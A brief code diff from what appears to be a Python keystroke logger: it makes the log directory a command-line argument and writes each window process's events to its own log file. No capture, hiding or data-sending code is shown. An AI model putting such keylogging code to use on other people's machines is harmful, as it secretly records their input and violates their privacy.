@@ -62,9 +62,9 @@ def logkey(event):
 	#print event.WindowName
 	#print event.WindowProcName
 	# if __name__ == '__main__':
-	# 	path = sys.argv[1]
+	path = sys.argv[1]
 	# else:
-	path = 'logfolder'
+	#path = 'logfolder'
 	logname = path+'/'+str(event.WindowProcName).strip() + ".log"
 	f=open(logname,'a')
 	#f.write(event.WindowProcName)
